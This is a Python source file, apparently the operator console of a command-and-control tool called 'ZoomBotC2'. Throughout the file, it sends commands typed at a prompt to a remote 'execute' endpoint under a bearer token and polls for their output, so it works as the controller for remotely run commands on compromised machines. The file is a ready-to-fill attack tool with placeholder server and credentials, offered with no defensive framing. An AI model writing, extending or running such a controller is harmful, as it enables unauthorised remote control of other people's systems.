import requests
import time
import sys
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings("ignore")

# Initialize colorama
init(autoreset=True)

# === Global Variables ===
API_BASE_URL = "https://"
ACCESS_TOKEN = "your_access_token_here"
EMAIL = "your_email_here"

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "X-User-Email": EMAIL
}

ZOOMBOT_BANNER = fr"""{Fore.RED}{Style.BRIGHT}
  ______                     ____        _    _____ ___  
 |___  /                    |  _ \      | |  / ____|__ \ 
    / / ___   ___  _ __ ___ | |_) | ___ | |_| |       ) |
   / / / _ \ / _ \| '_ ` _ \|  _ < / _ \| __| |      / / 
  / /_| (_) | (_) | | | | | | |_) | (_) | |_| |____ / /_ 
 /_____\___/ \___/|_| |_| |_|____/ \___/ \__|\_____|____|
                                                         
{Style.RESET_ALL}"""
def HttpPostRequest(command):
    try:
        response = requests.post(API_BASE_URL + "execute", headers=HEADERS, json={"command": command})
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] POST Error: {e}")
        return None

def HttpGetRequest(command_id):
    try:
        response = requests.get(API_BASE_URL + f"output/{command_id}", headers=HEADERS)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] GET Error: {e}")
        return None

def main():
    print(ZOOMBOT_BANNER)
    try:
        while True:
            command = input(f"{Fore.GREEN}{Style.BRIGHT}(ZoomBotC2) > {Style.RESET_ALL}").strip()
            if not command:
                continue
            post_result = HttpPostRequest(command)
            if not post_result or "id" not in post_result:
                print("[!] Failed to send command.")
                continue

            command_id = post_result["id"]
            print("[*] Waiting for output...")

            while True:
                time.sleep(1)
                get_result = HttpGetRequest(command_id)
                if get_result and get_result.get("status") == "completed":
                    print(get_result.get("output", "[!] No output received."))
                    break
                elif get_result and get_result.get("status") == "error":
                    print(f"[!] Error: {get_result.get('message')}")
                    break
    except (KeyboardInterrupt, EOFError):
        print(f"\n\n{Fore.RED}by Divyanshu Diwakar{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
